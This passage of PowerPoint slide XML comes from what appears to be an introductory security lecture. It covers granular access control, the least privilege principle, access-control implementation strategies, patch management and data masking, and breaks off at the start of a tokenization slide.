              <a:t> Can a salesperson only see customers from their own region? (Each row is filtered based on the user's identity.)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Action Level:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Can the user SELECT (read) data but not INSERT, UPDATE, or DELETE it?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Example</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>An HR assistant </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>might have </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>permission to:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	UPDATE the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>PhoneNumber</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> column in the Employees table.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>But </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>not</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	SELECT (see) the Salary column.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	DELETE any rows from the table.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3822768820"/>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7D3D3-9841-BB44-9562-5D469301CC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821564-F42E-2BBA-BDA5-0C918BCCBC5C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Benefits of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Granular Access Control</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2E4D330A-D42D-4817-AF1D-149447AA4C64}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2800" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Protects sensitive data at a very detailed level.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Enforces </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
              <a:t>need-to-know</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t> access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Reduces compliance risks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Prevents data leaks by insiders.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Scales well in large organizations with many users.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4060995429"/>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F471F-E1E6-3285-BCFD-4EB10E71661A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Least Privilege Principle</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F6AC4C5F-B5D0-6834-DB02-56B710930BB2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Principle of Least Privilege (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>PoLP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> states that a user, program, or process should be granted </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>only the minimum access rights necessary</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to perform its tasks — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>nothing more, nothing less</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Core security practice in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>access control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>system hardening</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Importance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Reduces Attack Surface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – fewer privileges → fewer opportunities for attackers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Limits Damage from Compromise</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – if an account is hacked, the attacker cannot do more than that account’s limited rights.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Prevents Insider Misuse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – users cannot abuse permissions they don’t have.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Supports Compliance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – required by GDPR, HIPAA, PCI-DSS, etc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Improves System Stability</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – processes run with low rights can’t accidentally break system-critical functions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Easier Forensics</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – limited privileges narrow down what could have been accessed or modified.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3456353733"/>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D431A-6329-2670-863C-72F7F4BDFB56}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Implementation Strategies</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{049CF876-2B7B-467F-1BD7-0E44483D06F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Role-Based Access Control (RBAC):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Assign roles with only the required permissions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Granular Permissions:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Use fine-grained policies (row, column, API-level).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Just-in-Time (JIT) Access:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Grant admin rights only temporarily, when needed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Regular Access Reviews:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Audit and revoke unused privileges.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Separation of Duties:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Divide tasks between multiple people to prevent abuse.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Default Deny Policy:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Start with no access, then add only required rights.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Strong Authentication &amp; MFA:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Ensure accounts with higher privileges are well-protected.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2146517897"/>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50505-F954-8515-1D4C-BBA2B838F54A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Patch Management</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4D46B5E-1DAB-EBB1-7BA0-16C0D0238135}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Introduction</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Definition:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Patch Management is the process of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>acquiring, testing, deploying, and monitoring software updates (patches)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to fix security vulnerabilities, improve performance, or add new features.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>patch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is a piece of code released by software vendors to fix bugs or vulnerabilities in applications, operating systems, or firmware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Importance of Patch Management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Fixes Security Vulnerabilities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – prevents exploitation by attackers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Protects Against Malware &amp; Ransomware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – many attacks exploit unpatched systems.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Ensures Compliance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – required by standards like PCI-DSS, HIPAA, ISO 27001.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Improves System Stability &amp; Performance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – patches often include bug fixes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Closes Zero-Day Risks Faster</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – applying patches quickly reduces exposure time.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Protects Reputation &amp; Trust</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – prevents breaches that could harm the organization.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3009814500"/>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8FDFE-D7C4-E419-CD9A-3C2C21C322E6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Data Masking </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F29C4E0-36F5-2C83-8B02-E50AAAA3ABC5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Data Masking:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> A technique to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>hide or alter sensitive data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> so unauthorized users cannot see the real values, while still keeping the data useful for testing, training, or analytics.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Real Credit Card → 4532-6789-1234-5678</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Masked Credit Card → 4532-XXXX-XXXX-5678</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Importance of Data Masking</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Protects sensitive data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (PII, financial, medical records).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Prevents insider threats</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> by limiting exposure.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Supports compliance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (GDPR, HIPAA, PCI-DSS).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Enables safe testing &amp; training</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> using realistic but fake data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Reduces breach impact</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> if test or lower environments are compromised.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Maintains data usability</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> for non-production purposes without revealing actual values.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1425378504"/>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B5020-3E76-59DF-7D38-3CC310A56B18}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Data Tokenization</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{63F7BE76-74F1-9B3F-8FF8-FD6CE8280A35}"/>
